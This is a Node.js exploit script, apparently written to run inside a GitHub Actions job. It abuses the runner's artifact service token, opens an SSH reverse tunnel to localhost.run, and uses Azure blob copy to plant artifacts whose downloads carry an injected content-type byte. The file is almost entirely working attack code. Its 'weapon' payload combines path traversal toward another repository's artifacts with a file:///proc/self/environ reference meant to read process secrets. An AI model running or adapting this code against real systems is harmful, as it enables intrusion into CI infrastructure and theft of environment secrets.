'use strict';
const crypto = require('node:crypto');
const net = require('node:net');
const tls = require('node:tls');
const https = require('node:https');
const {spawn} = require('node:child_process');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';
const EVIL = Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')]);

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = claims.scp.split(' ').find((v) => v.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return {token, base, runId, jobId};
}
async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {method: 'POST', headers: {
    Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json'},
    body: JSON.stringify({workflow_run_backend_id: ctx.runId, workflow_job_run_backend_id: ctx.jobId, ...fields}),
    signal: AbortSignal.timeout(30000)});
  const text = await response.text();
  let body = {}; try { body = JSON.parse(text); } catch {}
  return {status: response.status, body, text: text.slice(0, 200)};
}
function get(r, snake) {
  return r.body[snake] || r.body[snake.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}
function azure(url, options = {}) {
  return new Promise((resolve) => {
    const req = https.request(url, {method: options.method || 'GET', headers: options.headers || {},
      timeout: 30000, agent: false}, (res) => {
      const chunks = []; res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({status: res.statusCode, errorCode: res.headers['x-ms-error-code'] || ''}));
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', (e) => resolve({error: e.message}));
    req.end(options.body);
  });
}
function rawTlsGet(target) {
  return new Promise((resolve) => {
    const url = new URL(target); const chunks = [];
    const socket = tls.connect({host: url.hostname, port: 443, servername: url.hostname});
    const timer = setTimeout(() => socket.destroy(new Error('timeout')), 30000);
    socket.on('secureConnect', () => socket.write(`GET ${url.pathname}${url.search} HTTP/1.1\r\nHost: ${url.hostname}\r\nConnection: close\r\n\r\n`));
    socket.on('data', (c) => chunks.push(c));
    socket.on('end', () => { clearTimeout(timer); resolve({raw: Buffer.concat(chunks)}); });
    socket.on('error', (e) => { clearTimeout(timer); resolve({error: e.message, raw: Buffer.concat(chunks)}); });
  });
}
function ctLines(raw) {
  const head = raw.subarray(0, raw.indexOf(Buffer.from('\r\n\r\n'))).toString('latin1');
  return head.split('\r\n').filter((l) => /^content-type:/i.test(l)).map((l) => Buffer.from(l.slice(13), 'latin1').toString('hex'));
}

function startOrigin(state) {
  const server = net.createServer((socket) => {
    let request = Buffer.alloc(0);
    socket.on('data', (chunk) => {
      request = Buffer.concat([request, chunk]);
      if (!request.includes(Buffer.from('\r\n\r\n')) || socket.responded) return;
      socket.responded = true;
      const path = (request.toString('latin1').split('\r\n', 1)[0] || '').split(' ')[1] || '/';
      const label = decodeURIComponent(path.split('?', 1)[0].slice(1));
      const body = label === 'weapon' ? state.body : Buffer.from('{"probe":1}');
      socket.end(Buffer.concat([
        Buffer.from('HTTP/1.1 200 OK\r\nContent-Type: '), EVIL, Buffer.from('\r\n'),
        Buffer.from(`Content-Length: ${body.length}\r\nConnection: close\r\n\r\n`), body,
      ]));
    });
  });
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve({server, port: server.address().port}));
  });
}
function startSshTunnel(localPort) {
  const child = spawn('ssh', ['-o', 'StrictHostKeyChecking=no', '-o', 'ExitOnForwardFailure=yes',
    '-R', `80:127.0.0.1:${localPort}`, 'nokey@localhost.run'], {stdio: ['ignore', 'pipe', 'pipe']});
  return new Promise((resolve, reject) => {
    let output = '';
    const timer = setTimeout(() => { child.kill('SIGTERM'); reject(new Error('tunnel timeout')); }, 45000);
    const receive = (chunk) => {
      output += chunk.toString('utf8');
      const match = /https:\/\/([a-z0-9-]+\.lhr\.life)/i.exec(output);
      if (match) { clearTimeout(timer); resolve({child, host: match[1]}); }
    };
    child.stdout.on('data', receive); child.stderr.on('data', receive);
    child.once('error', (e) => { clearTimeout(timer); reject(e); });
  });
}

(async () => {
  const ctx = context();
  const state = {body: Buffer.from('{"probe":1}')};
  const origin = await startOrigin(state);
  const tunnel = await startSshTunnel(origin.port);
  const sourceUrl = (label) => `https://${tunnel.host}/${encodeURIComponent(label)}`;
  console.log('TUNNEL ' + tunnel.host);
  const variants = [
    {label: 'u85prefix', fields: {version: 7, mime_type: '\u0085application/json'}},
    {label: 'u85suffix', fields: {version: 7, mime_type: 'application/json\u0085'}},
    {label: 'u85octet', fields: {version: 7, mime_type: '\u0085application/octet-stream'}},
    {label: 'u1cprefix', fields: {version: 7, mime_type: '\u001capplication/json'}},
    {label: 'u85both', fields: {version: 7, mime_type: '\u0085application/json\u0085'}},
  ];
  try {
    for (const variant of variants) {
      const name = `norsct-${variant.label}-${Date.now()}`.slice(0, 200);
      const made = await rpc(ctx, 'CreateArtifact', {name, ...variant.fields});
      const upload = get(made, 'signed_upload_url');
      const out = {label: variant.label, create: made.status, hasUpload: Boolean(upload), createText: made.text};
      if (upload) {
        const copied = await azure(upload, {method: 'PUT', headers: {
          'Content-Length': '0', 'x-ms-version': '2021-08-06', 'x-ms-copy-source': sourceUrl('base'),
          'x-ms-blob-type': 'BlockBlob', 'x-ms-copy-source-blob-properties': 'true'}});
        out.pbf = copied.status;
        if (copied.status === 201) {
          const digest = crypto.createHash('sha256').update(state.body).digest('hex');
          const done = await rpc(ctx, 'FinalizeArtifact', {name, size: String(state.body.length), hash: `sha256:${digest}`});
          out.finalize = done.status;
          out.artifactId = get(done, 'artifact_id');
          const signed = await rpc(ctx, 'GetSignedArtifactURL', {name});
          const download = get(signed, 'signed_url');
          if (download) {
            out.rsct = new URL(download).searchParams.get('rsct');
            const raw = await rawTlsGet(download);
            out.ctHex = raw.raw ? ctLines(raw.raw) : raw.error;
            const ATOM = '85' + Buffer.from('application/json').toString('hex'); const ATOMOCT = '85' + Buffer.from('application/octet-stream').toString('hex');
            out.useful = Array.isArray(out.ctHex) && out.ctHex.some((h) => h.includes(ATOM) || h.includes(ATOMOCT));
          }
        }
      }
      if (out.useful && out.artifactId) {
        state.body = Buffer.from(JSON.stringify({
          full_name: `a/../../repos/lemonsour864/cassette/actions/artifacts/${out.artifactId}/zip`,
          owner: {login: 'u', avatar_url: 'file:///proc/self/environ'},
        }));
        const wcopy = await azure(upload, {method: 'PUT', headers: {
          'Content-Length': '0', 'x-ms-version': '2021-08-06', 'x-ms-copy-source': sourceUrl('weapon'),
          'x-ms-blob-type': 'BlockBlob', 'x-ms-copy-source-blob-properties': 'true'}});
        out.weapon = {copy: wcopy.status, artifactId: out.artifactId,
          sha: crypto.createHash('sha256').update(state.body).digest('hex')};
      } else if (out.artifactId) {
        await rpc(ctx, 'DeleteArtifact', {name});
      }
      console.log('CASE ' + JSON.stringify(out));
    }
  } finally {
    tunnel.child.kill('SIGTERM');
    origin.server.close();
  }
  console.log('DONE');
})().catch((e) => { console.error(e && e.stack || e); process.exitCode = 1; });
